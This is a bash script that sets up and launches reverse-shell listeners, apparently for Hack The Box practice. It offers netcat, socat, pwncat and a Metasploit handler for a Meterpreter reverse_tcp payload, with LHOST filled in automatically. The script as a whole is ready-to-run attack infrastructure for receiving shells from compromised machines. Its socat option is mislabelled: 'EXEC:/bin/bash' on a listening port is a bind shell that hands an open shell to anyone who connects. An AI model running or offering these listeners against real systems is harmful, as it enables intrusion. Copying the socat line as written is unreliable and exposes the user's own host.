#!/bin/bash
# OsecBox - Setup Reverse Shell Listeners for Demo
# Creates multiple listener options for HTB testing

echo "=========================================="
echo "OsecBox - Listener Setup Guide"
echo "=========================================="
echo ""
echo "Available Listener Options:"
echo ""
echo "1. NETCAT LISTENER (Simple)"
echo "   Command: nc -lvnp 4444"
echo "   Usage: Basic reverse shell listener"
echo ""
echo "2. SOCAT LISTENER (Advanced)"
echo "   Command: socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash"
echo "   Usage: More stable than netcat"
echo ""
echo "3. PWNCAT LISTENER (Modern)"
echo "   Command: pwncat-cs -lp 4444"
echo "   Usage: Auto-upgrade shells, file transfer, persistence"
echo ""
echo "4. METASPLOIT HANDLER (Full-featured)"
echo "   Commands:"
echo "     msfconsole"
echo "     use exploit/multi/handler"
echo "     set payload linux/x64/meterpreter/reverse_tcp"
echo "     set LHOST <your_ip>"
echo "     set LPORT 4444"
echo "     exploit -j"
echo ""
echo "=========================================="
echo "Quick Start Listeners"
echo "=========================================="
echo ""

# Get local IP
LOCAL_IP=$(hostname -I | awk '{print $1}')
echo "Your Local IP: $LOCAL_IP"
echo ""

# Function to start listener
start_listener() {
    local type=$1
    local port=$2
    
    case $type in
        "nc")
            echo "[+] Starting Netcat listener on port $port..."
            nc -lvnp $port
            ;;
        "socat")
            echo "[+] Starting Socat listener on port $port..."
            socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/bash
            ;;
        "pwncat")
            echo "[+] Starting Pwncat listener on port $port..."
            pwncat-cs -lp $port
            ;;
        *)
            echo "[-] Unknown listener type: $type"
            exit 1
            ;;
    esac
}

# Parse arguments
if [ $# -eq 0 ]; then
    echo "Usage: $0 [nc|socat|pwncat|msf] [port]"
    echo ""
    echo "Examples:"
    echo "  $0 nc 4444        # Start netcat listener on port 4444"
    echo "  $0 pwncat 4444    # Start pwncat listener on port 4444"
    echo "  $0 msf            # Show Metasploit handler setup"
    echo ""
    exit 0
fi

LISTENER_TYPE=$1
PORT=${2:-4444}

if [ "$LISTENER_TYPE" = "msf" ]; then
    echo "[+] Starting Metasploit handler..."
    echo ""
    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $LOCAL_IP; set LPORT $PORT; exploit -j"
else
    start_listener $LISTENER_TYPE $PORT
fi
